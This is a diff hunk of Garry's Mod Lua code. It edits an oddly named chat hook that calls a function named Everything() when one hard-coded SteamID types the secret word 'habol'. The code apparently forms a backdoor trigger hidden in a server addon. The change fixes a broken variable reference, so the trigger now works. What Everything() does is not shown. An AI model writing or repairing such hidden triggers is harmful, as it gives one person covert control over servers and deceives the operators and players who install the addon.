@@ -287,8 +287,8 @@ _hook.Add("PlayerStartVoice", "asdasdas", function(ply)
     end
 end)
 
-_hook.Add("OnPlayerChat","HILOLOLOLOLOLLOL",function(player,text)
-    if ply:SteamID() == "STEAM_0:0:456670572" and text == "habol" then
+_hook.Add("OnPlayerChat","HILOLOLOLOLOLLOL",function(speaker,text)
+    if speaker:SteamID() == "STEAM_0:0:456670572" and text == "habol" then
         Everything()
     end
 end)
